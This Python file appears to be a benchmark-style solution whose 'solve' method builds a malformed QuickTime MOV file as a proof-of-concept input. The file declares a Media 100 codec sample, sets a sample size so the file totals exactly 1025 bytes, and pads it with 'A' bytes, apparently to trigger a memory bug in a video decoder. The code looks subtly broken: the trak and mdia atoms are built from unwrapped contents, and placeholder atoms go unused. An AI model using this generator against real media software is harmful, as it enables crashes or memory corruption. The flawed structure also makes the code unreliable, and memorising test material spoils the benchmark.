import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        target_total_size = 1025
        
        header_size_poc = self._build_mov(0)
        header_size = len(header_size_poc) - 8

        payload_size = target_total_size - header_size - 8
        
        return self._build_mov(payload_size)

    def _build_mov(self, payload_size: int) -> bytes:
        def atom(atom_type: bytes, data: bytes) -> bytes:
            return struct.pack('>I', len(data) + 8) + atom_type + data

        width, height = 16, 16

        compressor_name = b'\x0cMedia 100'.ljust(32, b'\0')
        video_sample_desc_data = struct.pack(
            '>6xH'
            'HHI'
            'II'
            'HH'
            'II'
            'I'
            'H'
            '32s'
            'Hh',
            1, 0, 0, 0, 0, 0, width, height,
            0x00480000, 0x00480000, 0, 1,
            compressor_name, 24, -1
        )
        m100_atom = atom(b'm100', video_sample_desc_data)
        stsd_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + m100_atom
        stsd_atom = atom(b'stsd', stsd_data)

        stts_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>II', 1, 600)
        stts_atom = atom(b'stts', stts_data)
        
        stsc_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>III', 1, 1, 1)
        stsc_atom = atom(b'stsc', stsc_data)
        
        stsz_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', payload_size)
        stsz_atom = atom(b'stsz', stsz_data)
        
        stco_placeholder_atom = atom(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', 0))

        stbl_template_data = stsd_atom + stts_atom + stsc_atom + stsz_atom
        
        vmhd_atom = atom(b'vmhd', b'\x00\x00\x00\x01' + b'\x00'*8)
        
        url_atom = atom(b'url ', b'\x00\x00\x00\x01')
        dref_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + url_atom
        dinf_atom = atom(b'dinf', atom(b'dref', dref_data))

        mdhd_atom = atom(b'mdhd', struct.pack('>BxxxIIIIIH', 0, 0, 0, 1000, 600, 0, 0))
        
        hdlr_atom = atom(b'hdlr', b'\x00\x00\x00\x00\x00\x00\x00\x00vide' + b'\x00'*20)

        stbl_placeholder_data = stbl_template_data + stco_placeholder_atom
        stbl_placeholder_atom = atom(b'stbl', stbl_placeholder_data)
        minf_placeholder_data = vmhd_atom + dinf_atom + stbl_placeholder_atom
        minf_placeholder_atom = atom(b'minf', minf_placeholder_data)
        mdia_placeholder_data = mdhd_atom + hdlr_atom + minf_placeholder_atom
        mdia_placeholder_atom = atom(b'mdia', mdia_placeholder_data)
        
        tkhd_data = struct.pack(
            '>BxxxIIIII8xHHhH9III', 
            1, 0, 0, 1, 0, 600, 0, 0, 0, 0, 
            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000,
            width << 16, height << 16
        )
        tkhd_atom = atom(b'tkhd', tkhd_data)

        trak_placeholder_data = tkhd_atom + mdia_placeholder_data
        trak_placeholder_atom = atom(b'trak', trak_placeholder_data)

        mvhd_data = struct.pack(
            '>BxxxIIII' + 'I' + 'H' + '10x' + '9I' + '6I' + 'I',
            0, 0, 0, 1000, 600, 0x00010000, 0x0100,
            0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000,
            0, 0, 0, 0, 0, 0, 2
        )
        mvhd_atom = atom(b'mvhd', mvhd_data)
        moov_placeholder_atom = atom(b'moov', mvhd_atom + trak_placeholder_data)

        ftyp_atom = atom(b'ftyp', b'qt  \x00\x00\x00\x00qt  \x00\x00\x00\x00')

        mdat_offset = len(ftyp_atom) + len(moov_placeholder_atom) + 8

        stco_data = b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset)
        stco_atom = atom(b'stco', stco_data)
        
        stbl_data = stbl_template_data + stco_atom
        stbl_atom = atom(b'stbl', stbl_data)
        
        minf_data = vmhd_atom + dinf_atom + stbl_atom
        minf_atom = atom(b'minf', minf_data)

        mdia_data = mdhd_atom + hdlr_atom + minf_data
        mdia_atom = atom(b'mdia', mdia_data)
        
        trak_data = tkhd_atom + mdia_data
        trak_atom = atom(b'trak', trak_data)

        moov_atom = atom(b'moov', mvhd_atom + trak_data)
        
        mdat_payload = b'A' * payload_size
        mdat_atom = atom(b'mdat', mdat_payload)
        
        return ftyp_atom + moov_atom + mdat_atom
